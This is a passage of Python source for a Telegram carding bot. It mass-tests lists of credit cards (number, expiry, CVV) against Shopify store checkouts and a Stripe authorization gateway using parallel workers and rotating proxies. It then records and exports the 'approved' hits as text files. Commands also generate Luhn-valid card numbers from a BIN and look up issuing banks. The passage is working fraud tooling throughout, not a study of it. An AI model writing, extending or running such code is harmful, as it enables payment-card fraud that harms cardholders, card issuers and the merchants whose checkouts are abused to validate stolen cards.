    processing_msg = bot.reply_to(message, "🔓 *Checking with Stripe Auth Gateway (FREE)...*\n⏳ Please wait...", parse_mode='Markdown')
    
    bin_info = bin_lookup(cc[:6])
    category, status_msg, response_msg, price, gateway, elapsed = check_stripe_auth(cc, month, year, cvv)
    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    response = format_stripe_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
    
    if category in ['LIVE', '3DS', 'CVV']:
        hit_data = {
            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
            'category': category, 'status_msg': status_msg,
            'response_msg': response_msg,
            'gateway': gateway, 'price': price, 'elapsed': elapsed,
            'bin_info': bin_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_stripe_hit(hit_data)
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

# ============================================
# PROXY DELETE COMMAND
# ============================================

@bot.message_handler(commands=['delproxy'])
def delete_proxy_command(message):
    """Eliminar un proxy específico por índice o todos"""
    args = message.text.split()
    if len(args) < 2:
        # Mostrar lista de proxies con índices
        proxies = load_proxies()
        if not proxies:
            bot.reply_to(message, "📭 No proxies saved.")
            return
        
        response = f"📡 *{BOT_NAME} ─ PROXIES ({len(proxies)})*\n{LINE_DASH}\n\n"
        for i, proxy in enumerate(proxies, 1):
            parts = proxy.split(':')
            masked = f"{parts[0]}:{parts[1]}"
            if len(parts) >= 4:
                masked += ":****:****"
            response += f"  {i}. `{masked}`\n"
        
        response += f"\n{LINE_THIN}\n💡 `/delproxy <number>` to delete │ `/delproxy all` to clear"
        safe_send_message(message.chat.id, response, parse_mode='Markdown')
        return
    
    if args[1].lower() == 'all':
        count = len(load_proxies())
        clear_all_proxies()
        bot.reply_to(message, f"✅ Deleted {count} proxies")
        return
    
    try:
        index = int(args[1])
        removed = delete_proxy_by_index(index)
        if removed:
            bot.reply_to(message, f"✅ Deleted proxy: `{removed}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ Invalid index. Use `/delproxy` to see list")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number. Use `/delproxy <number>` or `/delproxy all`")

# ============================================
# MASS CHECK SHOPIFY (CON BOTONES SOLO STOP Y UPDATE CADA 5 CHK)
# ============================================

@bot.message_handler(commands=['mass'])
def mass_check_command(message):
    global mass_check_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
    
    if mass_check_running:
        bot.reply_to(message, "⚠️ Mass check already in progress. Use STOP button.")
        return
    
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ NO SITES AVAILABLE!\n\nPlease add sites first:\n/addsite https://store.myshopify.com")
        return
    
    cards = get_all_cards()
    if not cards:
        bot.reply_to(message, "❌ No Shopify cards saved. Send a .txt file.")
        return
    
    total = len(cards)
    if total > 1000:
        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs (your limit)\n1000 CCs will be checked")
        cards = cards[:1000]
        total = 1000
    
    stop_mass_flag = False
    mass_paused = False
    mass_check_running = True
    
    stats = {
        'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
        'declined': 0, 'errors': 0, 'total': total
    }
    
    completed = 0
    last_card = "WAITING..."
    last_response = "CONNECTING..."
    last_price = "$0.00"
    last_bin_info = None
    
    task_queue = Queue()
    result_queue = Queue()
    
    for card_str in cards:
        task_queue.put(card_str)
    
    for _ in range(PARALLEL_WORKERS):
        task_queue.put(None)
    
    def shopify_worker(worker_id):
        while not stop_mass_flag:
            if mass_paused:
                time.sleep(1)
                continue
            try:
                card_str = task_queue.get(timeout=1)
                if card_str is None:
                    break
                
                parts = card_str.split('|')
                if len(parts) < 4:
                    result_queue.put(('error', card_str, None, worker_id))
                    continue
                
                cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                bin_info = bin_lookup(cc[:6])
                result = check_card_shopify(cc, month, year, cvv)
                result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
            except:
                continue
    
    workers = []
    for i in range(PARALLEL_WORKERS):
        w = threading.Thread(target=shopify_worker, args=(i,))
        w.daemon = True
        w.start()
        workers.append(w)
    
    processed_cards = set()
    update_counter = 0
    
    # Botones estilo foto - SOLO STOP
    control_buttons = InlineKeyboardMarkup(row_width=1)
    control_buttons.add(
        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
    )
    
    progress_bar = create_progress_bar(completed, total)
    msg_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *SHOPIFY MASS CHECK*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
    
    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
    
    current_mass_msg = progress_msg
    current_mass_chat_id = message.chat.id
    
    def send_update():
        nonlocal last_card, last_response, update_counter
        
        total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
        
        # Solo actualizar cada 5 checks
        if update_counter % 5 == 0 or update_counter == 0 or completed == total:
            progress_bar = create_progress_bar(completed, total)
            update_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *SHOPIFY MASS CHECK*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{total_approved}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
            
            if not stop_mass_flag:
                try:
                    bot.edit_message_text(update_text, chat_id=message.chat.id, message_id=progress_msg.message_id,
                                        parse_mode='Markdown', reply_markup=control_buttons)
                except:
                    pass
    
    start_time = time.time()
    
    while completed < total and not stop_mass_flag:
        try:
            result_data = result_queue.get(timeout=0.5)
            
            if result_data[0] == 'error':
                card_str = result_data[1]
                if card_str in processed_cards:
                    continue
                processed_cards.add(card_str)
                completed += 1
                stats['errors'] += 1
                delete_card(card_str)
                update_counter += 1
                send_update()
            else:
                _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
                
                if card_str in processed_cards:
                    continue
                processed_cards.add(card_str)
                
                category, status_msg, response_msg, price, gateway, elapsed, site_used = result
                
                last_card = f"{cc[:6]}******{cc[-4:]}"
                last_response = response_msg if response_msg else status_msg
                last_price = price
                last_bin_info = bin_info
                
                if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
                    if category == 'CHARGE':
                        stats['charge'] += 1
                    elif category == '3DS':
                        stats['threeds'] += 1
                    elif category == 'CVV':
                        stats['cvv'] += 1
                    elif category == 'FUNDS':
                        stats['funds'] += 1
                    
                    icon, cat_display, dot = get_status_emoji(category)
                    hit_msg = f"""{dot} *SHOPIFY ─ APPROVED* {dot}
{LINE_THIN}
💳 `{cc}|{month}|{year}|{cvv}`
🌐 {gateway}
📝 {response_msg}
💲 {price}
{LINE_THIN}"""
                    
                    try:
                        bot.send_message(message.chat.id, hit_msg, parse_mode='Markdown')
                    except:
                        bot.send_message(message.chat.id, hit_msg.replace('`', '').replace('*', ''))
                    
                    hit_data = {
                        'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
                        'category': category, 'status_msg': response_msg,
                        'gateway': gateway, 'price': price, 'elapsed': elapsed,
                        'bin_info': bin_info,
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    save_hit(hit_data)
                elif category == 'DECLINED':
                    stats['declined'] += 1
                else:
                    stats['errors'] += 1
                
                completed += 1
                delete_card(card_str)
                update_counter += 1
                send_update()
                
        except:
            continue
    
    for w in workers:
        try:
            w.join(timeout=2)
        except:
            pass
    
    send_update()
    
    elapsed = time.time() - start_time
    minutes, seconds = int(elapsed // 60), int(elapsed % 60)
    total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
    
    try:
        sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
    except:
        pass
    
    final_bar = create_progress_bar(completed, total)
    final_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 *MASS CHECK COMPLETED*

`{final_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 *Charge:* {stats['charge']}
✅ *Approved:* {total_approved}
❌ *Declined:* {stats['declined']}
📊 *Total:* {completed}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏱ *Time:* {minutes}m {seconds}s"""
    
    result_keyboard = InlineKeyboardMarkup()
    result_keyboard.row(
        InlineKeyboardButton("🏆 Ver Hits", callback_data="hits"),
        InlineKeyboardButton("📦 Nuevo Mass", callback_data="mass")
    )
    
    try:
        bot.edit_message_text(final_text, chat_id=message.chat.id, message_id=progress_msg.message_id,
                            parse_mode='Markdown', reply_markup=result_keyboard)
    except:
        pass
    
    mass_check_running = False

# ============================================
# MASS CHECK STRIPE AUTH (CON BOTONES SOLO STOP Y UPDATE CADA 5 CHK)
# ============================================

@bot.message_handler(commands=['mau'])
def stripe_mass_command(message):
    """Mass check con Stripe Auth - Estilo foto"""
    global stripe_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
    
    if stripe_mass_running:
        bot.reply_to(message, "⚠️ Stripe Auth mass check already in progress. Use STOP button.")
        return
    
    cards = get_all_stripe_cards()
    if not cards:
        bot.reply_to(message, "❌ No Stripe Auth cards saved. Send a .txt file with 'au' or 'stripe' in the name.")
        return
    
    total = len(cards)
    if total > 1000:
        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs (your limit)\n1000 CCs will be checked")
        cards = cards[:1000]
        total = 1000
    
    stop_mass_flag = False
    mass_paused = False
    stripe_mass_running = True
    
    stats = {
        'live': 0, 'threeds': 0, 'cvv': 0,
        'declined': 0, 'errors': 0, 'total': total
    }
    
    completed = 0
    last_card = "WAITING..."
    last_response = "CONNECTING..."
    
    task_queue = Queue()
    result_queue = Queue()
    
    for card_str in cards:
        task_queue.put(card_str)
    
    for _ in range(PARALLEL_WORKERS):
        task_queue.put(None)
    
    def stripe_worker(worker_id):
        while not stop_mass_flag:
            if mass_paused:
                time.sleep(1)
                continue
            try:
                card_str = task_queue.get(timeout=1)
                if card_str is None:
                    break
                
                parts = card_str.split('|')
                if len(parts) < 4:
                    result_queue.put(('error', card_str, None, worker_id))
                    continue
                
                cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                bin_info = bin_lookup(cc[:6])
                result = check_stripe_auth(cc, month, year, cvv)
                result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
            except:
                continue
    
    workers = []
    for i in range(PARALLEL_WORKERS):
        w = threading.Thread(target=stripe_worker, args=(i,))
        w.daemon = True
        w.start()
        workers.append(w)
    
    processed_cards = set()
    update_counter = 0
    
    # Botones estilo foto - SOLO STOP
    control_buttons = InlineKeyboardMarkup(row_width=1)
    control_buttons.add(
        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
    )
    
    progress_bar = create_progress_bar(completed, total)
    msg_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *STRIPE AUTH MASS CHECK* ─ FREE

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💚 Live: *{stats['live']}*  │  🔐 3DS: *{stats['threeds']}*  │  🔶 CVV: *{stats['cvv']}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
    
    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
    
    current_mass_msg = progress_msg
    current_mass_chat_id = message.chat.id
    
    def send_update():
        nonlocal last_card, last_response, update_counter
        
        total_approved = stats['live'] + stats['threeds'] + stats['cvv']
        
        # Solo actualizar cada 5 checks
        if update_counter % 5 == 0 or update_counter == 0 or completed == total:
            progress_bar = create_progress_bar(completed, total)
            update_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *STRIPE AUTH MASS CHECK* ─ FREE

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💚 Live: *{stats['live']}*  │  🔐 3DS: *{stats['threeds']}*  │  🔶 CVV: *{stats['cvv']}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
            
            if not stop_mass_flag:
                try:
                    bot.edit_message_text(update_text, chat_id=message.chat.id, message_id=progress_msg.message_id,
                                        parse_mode='Markdown', reply_markup=control_buttons)
                except:
                    pass
    
    start_time = time.time()
    
    while completed < total and not stop_mass_flag:
        try:
            result_data = result_queue.get(timeout=0.5)
            
            if result_data[0] == 'error':
                card_str = result_data[1]
                if card_str in processed_cards:
                    continue
                processed_cards.add(card_str)
                completed += 1
                stats['errors'] += 1
                delete_stripe_card(card_str)
                update_counter += 1
                send_update()
            else:
                _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
                
                if card_str in processed_cards:
                    continue
                processed_cards.add(card_str)
                
                category, status_msg, response_msg, price, gateway, elapsed = result
                
                last_card = f"{cc[:6]}******{cc[-4:]}"
                clean_response = response_msg
                if clean_response.startswith('[unknown]'):
                    clean_response = clean_response.replace('[unknown]', '').strip()
                elif clean_response.startswith('unknown'):
                    clean_response = clean_response.replace('unknown', '').strip()
                last_response = clean_response if clean_response else status_msg
                
                if category in ['LIVE', '3DS', 'CVV']:
                    if category == 'LIVE':
                        stats['live'] += 1
                    elif category == '3DS':
                        stats['threeds'] += 1
                    elif category == 'CVV':
                        stats['cvv'] += 1
                    
                    icon, cat_display, dot = get_status_emoji(category)
                    hit_msg = f"""{dot} *STRIPE AUTH ─ {cat_display}* {dot}
{LINE_THIN}
💳 `{cc}|{month}|{year}|{cvv}`
🌐 {gateway}
📝 {clean_response}
💲 {price}
{LINE_THIN}"""
                    
                    try:
                        bot.send_message(message.chat.id, hit_msg, parse_mode='Markdown')
                    except:
                        bot.send_message(message.chat.id, hit_msg.replace('`', '').replace('*', ''))
                    
                    hit_data = {
                        'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
                        'category': category, 'status_msg': status_msg,
                        'response_msg': clean_response,
                        'gateway': gateway, 'price': price, 'elapsed': elapsed,
                        'bin_info': bin_info,
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    save_stripe_hit(hit_data)
                elif category == 'DECLINED':
                    stats['declined'] += 1
                else:
                    stats['errors'] += 1
                
                completed += 1
                delete_stripe_card(card_str)
                update_counter += 1
                send_update()
                
        except:
            continue
    
    for w in workers:
        try:
            w.join(timeout=2)
        except:
            pass
    
    send_update()
    
    elapsed = time.time() - start_time
    minutes, seconds = int(elapsed // 60), int(elapsed % 60)
    total_approved = stats['live'] + stats['threeds'] + stats['cvv']
    
    try:
        sqlite_backup.update_daily_stats(0, 0, 0, 0, completed, total_approved, current_mode)
    except:
        pass
    
    final_bar = create_progress_bar(completed, total)
    final_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 *STRIPE AUTH COMPLETED*

`{final_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💚 *Live:* {stats['live']}
🔐 *3DS:* {stats['threeds']}
🔶 *CVV:* {stats['cvv']}
❌ *Declined:* {stats['declined']}
📊 *Total:* {completed}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏱ *Time:* {minutes}m {seconds}s"""
    
    result_keyboard = InlineKeyboardMarkup()
    result_keyboard.row(
        InlineKeyboardButton("🔓 Ver AU Hits", callback_data="stripe_hits"),
        InlineKeyboardButton("🔓 Nuevo AU Mass", callback_data="stripe_mass")
    )
    
    try:
        bot.edit_message_text(final_text, chat_id=message.chat.id, message_id=progress_msg.message_id,
                            parse_mode='Markdown', reply_markup=result_keyboard)
    except:
        pass
    
    stripe_mass_running = False

# ============================================
# HITS COMMANDS
# ============================================

@bot.message_handler(commands=['auhits'])
def stripe_hits_command(message):
    hits = get_stripe_hits()
    if not hits:
        bot.reply_to(message, "📭 No Stripe Auth approved cards yet.")
        return
    
    content = "═" * 50 + "\n"
    content += f"  🔓 STRIPE AUTH {BOT_VERSION} - APPROVED CARDS (FREE)\n"
    content += f"  📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    content += "═" * 50 + "\n\n"
    
    for i, hit in enumerate(hits, 1):
        content += f"━━ [{i}] {hit.get('category', 'UNKNOWN')} ━━\n"
        content += f"  💳 CC: {hit.get('cc', '')}|{hit.get('month', '')}|{hit.get('year', '')}|{hit.get('cvv', '')}\n"
        content += f"  📝 Status: {hit.get('status_msg', '')}\n"
        content += f"  📝 Response: {hit.get('response_msg', '')}\n"
        content += f"  💲 Price: {hit.get('price', 'FREE')}\n"
        content += f"  🌐 Gateway: {hit.get('gateway', 'Stripe Auth')}\n"
        content += f"  ⏱ Time: {hit.get('elapsed', 0)}s\n"
        if hit.get('bin_info'):
            content += f"  🏦 BIN: {hit.get('bin_info', {}).get('info', '')}\n"
            content += f"  🏦 Bank: {hit.get('bin_info', {}).get('bank', '')}\n"
            content += f"  🌍 Country: {hit.get('bin_info', {}).get('country', '')}\n"
        content += "┄" * 40 + "\n\n"
    
    content += "═" * 50 + "\n"
    content += f"  🏆 TOTAL STRIPE HITS: {len(hits)}\n"
    content += "═" * 50 + "\n"
    
    file_data = BytesIO(content.encode('utf-8'))
    file_data.name = f"stripe_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(message.chat.id, file_data, caption=f"🔓 {len(hits)} Stripe Auth approved cards")

@bot.message_handler(commands=['clearau'])
def clear_stripe_command(message):
    count = len(get_all_stripe_cards())
    if count == 0:
        bot.reply_to(message, "📭 No Stripe Auth cards to delete.")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ YES", callback_data="confirm_clear_stripe"),
        InlineKeyboardButton("❌ NO", callback_data="cancel_clear")
    )
    bot.reply_to(message, f"⚠️ *CONFIRM DELETE*\n\nDelete {count} Stripe Auth cards?\nThis action cannot be undone.", 
                 parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['clearshopify'])
def clear_shopify_command(message):
    count = len(get_all_cards())
    if count == 0:
        bot.reply_to(message, "📭 No Shopify cards to delete.")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ YES", callback_data="confirm_clear_shopify"),
        InlineKeyboardButton("❌ NO", callback_data="cancel_clear")
    )
    bot.reply_to(message, f"⚠️ *CONFIRM DELETE*\n\nDelete {count} Shopify cards?\nThis action cannot be undone.", 
                 parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['stop'])
def stop_mass_check(message):
    global mass_check_running, stripe_mass_running, stop_mass_flag
    if mass_check_running or stripe_mass_running:
        stop_mass_flag = True
        mass_check_running = False
        stripe_mass_running = False
        bot.reply_to(message, "✅ Mass check stopped")
    else:
        bot.reply_to(message, "ℹ️ No active mass check")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    sites = load_sites()
    proxies = load_proxies()
    cards = get_all_cards()
    stripe_cards = get_all_stripe_cards()
    hits = get_hits()
    stripe_hits = get_stripe_hits()
    permanent = sqlite_backup.get_permanent_sites()
    
    stats_text = f"""📊 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 *STATISTICS PANEL*

🛒 *━━ SHOPIFY ━━*
   ├ 💳 Queued: *{len(cards)}*
   ├ 🏆 Hits: *{len(hits)}*
   ├ 🌐 Sites: *{len(sites)}*
   └ 🔒 Permanent: *{len(permanent)}*

🔓 *━━ STRIPE AUTH (FREE) ━━*
   ├ 💳 Queued: *{len(stripe_cards)}*
   └ 🏆 Hits: *{len(stripe_hits)}*

⚙️ *━━ SYSTEM ━━*
   ├ 📡 Proxies: *{len(proxies)}*
   ├ 👷 Workers: *{current_max_workers}*
   └ 🎮 Mode: *{current_mode}* ({PARALLEL_WORKERS}x)
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
    safe_send_message(message.chat.id, stats_text, parse_mode='Markdown')

@bot.message_handler(commands=['hits'])
def hits_command(message):
    hits = get_hits()
    if not hits:
        bot.reply_to(message, "📭 No Shopify approved cards yet.")
        return
    content = export_hits_txt()
    if content:
        file_data = BytesIO(content.encode('utf-8'))
        file_data.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        bot.send_document(message.chat.id, file_data, caption=f"🏆 {len(hits)} Shopify approved cards")

@bot.message_handler(commands=['px'])
def proxy_check_command(message):
    proxies = load_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ No proxies to check")
        return
    total = len(proxies)
    msg = bot.reply_to(message, f"⏳ Deep checking {total} proxies (3-level verification)...")
    start_time = time.time()
    alive, dead, reasons = verify_proxy_batch(proxies, deep=True)
    elapsed = time.time() - start_time
    global last_dead_proxies
    last_dead_proxies = dead
    
    socket_fail = sum(1 for r in reasons.values() if r == 'SOCKET_FAIL')
    http_fail = sum(1 for r in reasons.values() if r == 'HTTP_FAIL')
    request_fail = sum(1 for r in reasons.values() if r == 'REQUEST_FAIL')
    timeout_fail = sum(1 for r in reasons.values() if r == 'TIMEOUT')
    
    summary = f"""📡 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 *DEEP PROXY CHECK ─ 3 LEVELS*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⚡ *Speed:* {total/elapsed:.1f} proxies/s
⏱ *Time:* {elapsed:.1f}s
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✅ *Alive (all 3 tests passed):* {len(alive)}
💀 *Dead:* {len(dead)}
📊 *Total:* {total}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🔬 *Failure Breakdown:*
   ├ 🔌 Socket fail: {socket_fail}
   ├ 🌐 HTTP tunnel fail: {http_fail}
   ├ 📡 Request fail: {request_fail}
   └ ⏱ Timeout: {timeout_fail}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📋 *Verification Levels:*
   1️⃣ TCP Socket Connection
   2️⃣ HTTP CONNECT Tunnel
   3️⃣ Real HTTPS Request
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
    markup = InlineKeyboardMarkup()
    if dead:
        markup.add(InlineKeyboardButton("🗑️ DELETE DEAD PROXIES", callback_data="delete_dead_proxies"))
    try:
        bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, 
                            parse_mode='Markdown', reply_markup=markup if markup.keyboard else None)
    except:
        bot.edit_message_text(summary.replace('*', ''), chat_id=message.chat.id, 
                            message_id=msg.message_id, reply_markup=markup if markup.keyboard else None)

@bot.message_handler(commands=['addsite'])
def add_site_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /addsite store.myshopify.com")
        return
    url = clean_url(args[1].strip())
    if not url:
        bot.reply_to(message, "❌ Invalid URL")
        return
    if add_site(url):
        bot.reply_to(message, f"✅ Site added:\n{url}")
    else:
        bot.reply_to(message, "⚠️ Site already exists")

@bot.message_handler(commands=['listsites'])
def list_sites_command(message):
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ No sites saved")
        return
    
    permanent_urls = [s['url'] for s in sqlite_backup.get_permanent_sites()]
    permanent_sites = [s for s in sites if s in permanent_urls]
    normal_sites = [s for s in sites if s not in permanent_urls]
    
    response = f"🌐 *{BOT_NAME} ─ SITES ({len(sites)})*\n{LINE_DASH}\n\n"
    
    if permanent_sites:
        response += "🔒 *PERMANENT (never removed):*\n"
        for i, site in enumerate(permanent_sites[:10], 1):
            response += f"  {i}. `{site}`\n"
        if len(permanent_sites) > 10:
            response += f"  _... and {len(permanent_sites) - 10} more_\n"
        response += "\n"
    
    if normal_sites:
        response += "🔄 *NORMAL:*\n"
        for i, site in enumerate(normal_sites[:20], len(permanent_sites) + 1):
            response += f"  {i}. `{site}`\n"
        if len(normal_sites) > 20:
            response += f"  _... and {len(normal_sites) - 20} more_\n"
    
    response += f"\n{LINE_THIN}\n💡 Use `/addsite url` to add │ `/listsites` to view"
    safe_send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['gen'])
def gen_command(message):
    """Comando /gen - Generar tarjetas válidas con algoritmo de Luhn"""
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /gen 424242 [amount]\nExample: /gen 424242 10")
        return
    
    bin_prefix = args[1].strip()
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        bot.reply_to(message, "❌ Invalid BIN. Must be at least 6 digits. Example: /gen 424242")
        return
    
    count = 10
    if len(args) >= 3:
        try:
            count = min(int(args[2]), 50)
            count = max(1, count)
        except ValueError:
            count = 10
    
    processing_msg = bot.reply_to(message, f"⚙️ *Generating {count} cards with Luhn algorithm...*", parse_mode='Markdown')
    
    cards = generate_cards_from_bin(bin_prefix, count)
    bin_info = bin_lookup(bin_prefix[:6])
    
    cards_text = '\n'.join([f"`{c}`" for c in cards])
    
    if bin_info:
        response = f"""{get_bot_header('shopify')}

🎲 *CARD GENERATOR ─ LUHN*
{LINE_DOT}
💳 {stylize_text('BIN')}  ➜  `{bin_prefix}`
🔢 {stylize_text('Amount')}  ➜  {len(cards)}

📋 *{stylize_text('BIN Info')}*
   ├ {stylize_text('Type')}: {bin_info.get('info', 'Unknown')}
   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}

💳 *{stylize_text('Generated Cards')}*
{cards_text}

✅ All cards pass Luhn validation
{get_bot_footer()}"""
    else:
        response = f"""{get_bot_header('shopify')}

🎲 *CARD GENERATOR ─ LUHN*
{LINE_DOT}
💳 {stylize_text('BIN')}  ➜  `{bin_prefix}`
🔢 {stylize_text('Amount')}  ➜  {len(cards)}

💳 *{stylize_text('Generated Cards')}*
{cards_text}

✅ All cards pass Luhn validation
{get_bot_footer()}"""
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['bin'])
def bin_command(message):
    """Comando /bin - Consultar info de un BIN sin hacer check"""
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /bin 424242")
        return
    
    bin_number = args[1].strip()[:6]
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.reply_to(message, "❌ Invalid BIN. Must be 6 digits. Example: /bin 424242")
        return
    
    processing_msg = bot.reply_to(message, "🔍 *Looking up BIN info...*", parse_mode='Markdown')
    
    bin_info = bin_lookup(bin_number)
    
    if bin_info:
        response = f"""{get_bot_header('shopify')}

🏦 *BIN LOOKUP*
{LINE_DOT}
💳 {stylize_text('BIN')}  ➜  `{bin_number}`

📋 *{stylize_text('Details')}*
   ├ {stylize_text('Type')}: {bin_info.get('info', 'Unknown')}
   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}
{get_bot_footer()}"""
    else:
        response = f"""❌ *BIN NOT FOUND*
{LINE_THIN}
🏦 BIN `{bin_number}` not found in database.
💡 Try another BIN number."""
    
    try:
